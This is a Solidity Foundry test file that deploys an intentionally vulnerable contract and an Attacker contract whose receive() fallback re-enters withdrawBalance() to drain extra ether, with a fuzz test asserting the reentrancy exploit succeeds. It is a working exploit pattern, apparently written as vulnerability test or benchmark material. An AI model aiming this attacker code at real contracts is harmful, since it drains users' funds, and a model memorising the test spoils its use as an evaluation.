
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {Reentrancy_insecure} from "../src/Reentrancy_insecure.sol";

contract TestReentrancyReentrancy_insecure is Test {
    using stdStorage for StdStorage;

    Reentrancy_insecure public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_insecure();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // The vulnerable function requires userBalances[msg.sender] to be set.
        // We use stdstore to set the attacker's balance in the private mapping.
        
        // --- 3. Funding ---
        // Fund the Victim contract with enough ETH to be drained (at least 2x attackVal for reentrancy)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // Setup the attacker's balance in the victim contract's userBalances mapping
        _attacker.setupAttack(attackVal);
        
        // Set the userBalances for the attacker in the victim contract
        // userBalances is at slot 0, and we need to compute the mapping slot for the attacker's address
        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));
        
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_insecure public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = Reentrancy_insecure(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        // Capture Initial State
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // Call the vulnerable function
        _victim.withdrawBalance();

        // Verify Success Conditions
        // If we managed to call withdraw multiple times, the attack succeeded
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
        
        // Also verify we received more than expected (drained extra funds)
        if (address(this).balance > initialSnapshot + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter if we haven't reached our limit and victim still has funds
        if (attackCallCount < 2 && address(_victim).balance >= storedAttackVal) {
            _victim.withdrawBalance();
        }
    }
}
